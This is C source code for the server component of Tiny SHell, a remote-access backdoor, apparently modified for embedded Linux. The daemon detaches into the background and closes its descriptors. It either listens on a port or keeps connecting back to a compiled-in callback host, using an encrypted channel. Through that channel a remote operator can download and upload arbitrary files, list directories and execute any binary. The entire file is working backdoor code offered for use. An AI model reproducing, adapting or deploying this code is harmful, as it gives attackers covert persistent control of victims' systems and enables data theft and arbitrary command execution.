/*
 * Tiny SHell version 0.6 - server side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 *
 * Modified for embedded systems:
 * - Direct library calls for ls/get/put/exec
 * - Monocypher (X25519/Ed25519/ChaCha20-Poly1305) crypto layer
 * - Zero stdio formatted I/O and zero dynamic memory allocation
 * - SYS_getdents64 raw syscalls
 * - Adheres to Barr-C:2018 coding standards
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <signal.h>

#include "tsh.h"
#include "pel.h"

char *secret = SECRET_KEY;
char *cb_host = CB_HOST;
int server_port = SERVER_PORT;

unsigned char message[BUFSIZE + 1];
extern char *optarg;
extern int optind;

/* Linux 64-bit directory entry struct for SYS_getdents64 */
struct linux_dirent64
{
    uint64_t       d_ino;
    int64_t        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

/* Function declarations */
int process_client( int client );
int tshd_get_file( int client );
int tshd_put_file( int client );
int tshd_ls_dir( int client );
int tshd_execv( int client );

/* Non-stdio string formatting helpers */
static char *append_str( char *dst, const char *src )
{
    while( *src != '\0' )
    {
        *dst++ = *src++;
    }
    return dst;
}

static char *append_octal6( char *dst, uint32_t val )
{
    int i;
    for( i = 5; i >= 0; i-- )
    {
        dst[i] = (char)( '0' + ( val & 0x7 ) );
        val >>= 3;
    }
    return dst + 6;
}

static char *append_uint( char *dst, uint64_t val )
{
    char tmp[24];
    int i = 0;

    if( val == 0 )
    {
        *dst++ = '0';
        return dst;
    }

    while( val > 0 )
    {
        tmp[i++] = (char)( '0' + ( val % 10 ) );
        val /= 10;
    }

    while( i > 0 )
    {
        *dst++ = tmp[--i];
    }

    return dst;
}

static void sigterm_handler( int sig )
{
    (void) sig;
    exit( 0 );
}

/* Program entry point */
int main( int argc, char *argv[] )
{
    int ret, pid;
    socklen_t n;
    int client;
    struct sockaddr_in client_addr;
    int foreground = 0;

    signal( SIGTERM, sigterm_handler );
    signal( SIGINT, sigterm_handler );

    if( argc > 1 && strcmp( argv[1], "-f" ) == 0 )
    {
        foreground = 1;
    }

    if( !foreground )
    {
        /* fork into background */

        pid = fork();

        if( pid < 0 )
        {
            return( 1 );
        }

        if( pid != 0 )
        {
            return( 0 );
        }

        /* create a new session */

        if( setsid() < 0 )
        {
            return( 2 );
        }

        /* close all file descriptors */

        for( n = 0; n < 1024; n++ )
        {
#ifdef DEBUG
            if( n == 2 )
            {
                continue;
            }
#endif
            close( n );
        }
    }

#ifndef CB_MODE /* normal bind mode */
    struct sockaddr_in server_addr;
    int server;

    if( cb_host == NULL )
    {
        /* create a socket */

        server = socket( AF_INET, SOCK_STREAM, 0 );

        if( server < 0 )
        {
            return( 3 );
        }

        /* bind the server on the port the client will connect to */

        n = 1;

        ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
                          (void *) &n, sizeof( n ) );

        if( ret < 0 )
        {
            return( 4 );
        }

        server_addr.sin_family      = AF_INET;
        server_addr.sin_port        = htons( server_port );
        server_addr.sin_addr.s_addr = INADDR_ANY;

        ret = bind( server, (struct sockaddr *) &server_addr,
                    sizeof( server_addr ) );

        if( ret < 0 )
        {
            return( 5 );
        }

        if( listen( server, 5 ) < 0 )
        {
            return( 6 );
        }

        while( 1 )
        {
            /* wait for inbound connections */

            n = sizeof( client_addr );

            client = accept( server, (struct sockaddr *)
                             &client_addr, &n );

            if( client < 0 )
            {
                return( 7 );
            }

            ret = process_client( client );

            if( ret == 1 )
            {
                continue;
            }

            return( ret );
        }
    }
#else

    /* -c specified, connect back mode */

    while( 1 )
    {
        sleep( CONNECT_BACK_DELAY );

        if( cb_host == NULL )
        {
            continue;
        }

        memset( &client_addr, 0, sizeof( client_addr ) );
        client_addr.sin_family = AF_INET;
        client_addr.sin_port   = htons( server_port );

        /* parse client IPv4 address */
        if( inet_pton( AF_INET, cb_host, &client_addr.sin_addr ) <= 0 )
        {
            continue;
        }

        /* create a socket */

        client = socket( AF_INET, SOCK_STREAM, 0 );

        if( client < 0 )
        {
            continue;
        }

        /* try to connect back to the client */

        ret = connect( client, (struct sockaddr *) &client_addr,
                       sizeof( client_addr ) );

        if( ret < 0 )
        {
            close( client );
            continue;
        }

        ret = process_client( client );
        if( ret == 1 )
        {
            continue;
        }

        return( ret );
    }
#endif

    return( 0 );
}

int process_client( int client )
{
    int pid, ret, action;
    int len;

    /* fork a child to handle the connection */

    pid = fork();

    if( pid < 0 )
    {
        close( client );
        return( 1 );
    }

    if( pid != 0 )
    {
        waitpid( pid, NULL, 0 );
        close( client );
        return( 1 );
    }

    /* the child forks and then exits so that the grand-child's
     * father becomes init (this to avoid becoming a zombie) */

    pid = fork();

    if( pid < 0 )
    {
        return( 8 );
    }

    if( pid != 0 )
    {
        return( 9 );
    }

    /* setup the packet encryption layer */

    alarm( 20 );

    ret = pel_server_init( client, secret );

    if( ret != PEL_SUCCESS )
    {
        shutdown( client, 2 );
        return( 10 );
    }

    alarm( 0 );

    /* which action does the user wants us to do? */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 11 );
    }

    if( len != 1 )
    {
        return( 12 );
    }

    action = (int) message[0];

    switch( action )
    {
        case GET_FILE:

            ret = tshd_get_file( client );
            break;

        case PUT_FILE:

            ret = tshd_put_file( client );
            break;

        case LS_DIR:

            ret = tshd_ls_dir( client );
            break;

        case EXEC_BIN:

            ret = tshd_execv( client );
            break;

        default:

            ret = 15;
            break;
    }

    shutdown( client, 2 );
    return( ret );
}

int tshd_get_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 13 );
    }

    message[len] = '\0';

    /* open local file */

    fd = open( (char *) message, O_RDONLY );

    if( fd < 0 )
    {
        return( 14 );
    }

    /* send the data */

    while( 1 )
    {
        len = read( fd, message, BUFSIZE );

        if( len == 0 )
        {
            break;
        }

        if( len < 0 )
        {
            close( fd );
            return( 16 );
        }

        ret = pel_send_msg( client, message, len );

        if( ret != PEL_SUCCESS )
        {
            close( fd );
            return( 17 );
        }
    }

    close( fd );
    return( 18 );
}

int tshd_put_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 19 );
    }

    message[len] = '\0';

    /* create local file */

    fd = creat( (char *) message, 0644 );

    if( fd < 0 )
    {
        return( 20 );
    }

    /* fetch the data */

    while( 1 )
    {
        ret = pel_recv_msg( client, message, &len );

        if( ret != PEL_SUCCESS )
        {
            if( pel_errno == PEL_CONN_CLOSED )
            {
                break;
            }

            close( fd );
            return( 21 );
        }

        if( write( fd, message, len ) != len )
        {
            close( fd );
            return( 22 );
        }
    }

    close( fd );
    return( 23 );
}

int tshd_ls_dir( int client )
{
    int ret, len, dfd;
    struct stat st;
    char path[BUFSIZE];
    char line[BUFSIZE + 256];
    char getdents_buf[1024] __attribute__( ( aligned( 8 ) ) );
    int nread;

    /* get the directory path */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 56 );
    }

    message[len] = '\0';
    strncpy( path, (char *) message, BUFSIZE - 1 );
    path[BUFSIZE - 1] = '\0';

    /* open the directory */

    dfd = open( path, O_RDONLY | O_DIRECTORY );

    if( dfd < 0 )
    {
        return( 57 );
    }

    /* iterate through entries using SYS_getdents64 */

    while( ( nread = (int) syscall( SYS_getdents64, dfd, getdents_buf,
                                    sizeof( getdents_buf ) ) ) > 0 )
    {
        int bpos;
        for( bpos = 0; bpos < nread; )
        {
            struct linux_dirent64 *entry;
            entry = (struct linux_dirent64 *)( getdents_buf + bpos );
            char *p = line;

            if( fstatat( dfd, entry->d_name, &st, AT_SYMLINK_NOFOLLOW ) == 0 )
            {
                /* Format: mode owner group size name\n */
                p = append_octal6( p, (uint32_t) st.st_mode );
                *p++ = ' ';
                p = append_uint( p, (uint64_t) st.st_uid );
                *p++ = ' ';
                p = append_uint( p, (uint64_t) st.st_gid );
                *p++ = ' ';
                p = append_uint( p, (uint64_t) st.st_size );
                *p++ = ' ';
                p = append_str( p, entry->d_name );
                *p++ = '\n';
                *p = '\0';
            }
            else
            {
                p = append_str( p, "?????? ? ? ? " );
                p = append_str( p, entry->d_name );
                *p++ = '\n';
                *p = '\0';
            }

            ret = pel_send_msg( client, (unsigned char *) line,
                                (int)( p - line ) );

            if( ret != PEL_SUCCESS )
            {
                close( dfd );
                return( 58 );
            }

            bpos += entry->d_reclen;
        }
    }

    close( dfd );

    return( 59 );
}

int tshd_execv( int client )
{
    int ret, len, pid, status;
    char *argv[64];
    int i = 0;
    unsigned char exit_code;

    /* get the command line */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 60 );
    }

    message[len] = '\0';

    /* parse directly on message buffer without strdup/malloc */

    char *token = strtok( (char *) message, " " );
    while( token != NULL && i < 63 )
    {
        argv[i++] = token;
        token = strtok( NULL, " " );
    }
    argv[i] = NULL;

    if( i == 0 )
    {
        return( 62 );
    }

    pid = fork();

    if( pid < 0 )
    {
        return( 64 );
    }

    if( pid == 0 )
    {
        /* child */

        close( client );

        execv( argv[0], argv );

        /* if execv returns, an error occurred */
        exit( 1 );
    }
    else
    {
        /* parent */

        waitpid( pid, &status, 0 );

        if( WIFEXITED( status ) )
        {
            exit_code = (unsigned char) WEXITSTATUS( status );
        }
        else
        {
            exit_code = 255;
        }

        pel_send_msg( client, &exit_code, 1 );
    }

    return( 0 );
}